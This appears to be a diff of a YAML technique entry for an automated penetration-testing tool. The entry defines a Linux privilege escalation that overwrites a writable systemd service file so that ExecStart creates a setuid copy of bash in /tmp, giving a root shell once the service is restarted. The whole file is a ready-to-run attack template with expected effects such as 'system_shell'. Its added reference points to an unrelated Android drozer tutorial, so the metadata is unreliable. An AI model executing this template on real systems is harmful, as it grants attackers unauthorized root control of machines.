@@ -2,15 +2,21 @@ name: service_file_overwrite
 category: privesc
 description: Overwrite systemd service file
 preconditions:
-  - os==linux
+- os==linux
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "echo '[Service]\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"' > /path/to/service.service"
-parser: null
+command_template: 'echo ''[Service]\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash;
+  chmod +s /tmp/rootbash"'' > /path/to/service.service
+
+  '
+parser: generic_parser
 expected_effects:
-  - action_completed
+- service_hijacked
+- system_shell
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If systemd service file or its directory is writable, modify ExecStart to execute as the service user (often root). Trigger via systemctl restart or reboot."
+mechanism: If systemd service file or its directory is writable, modify ExecStart
+  to execute as the service user (often root). Trigger via systemctl restart or reboot.
+hacktricks_ref: mobile-pentesting/android-app-pentesting/drozer-tutorial/README.md
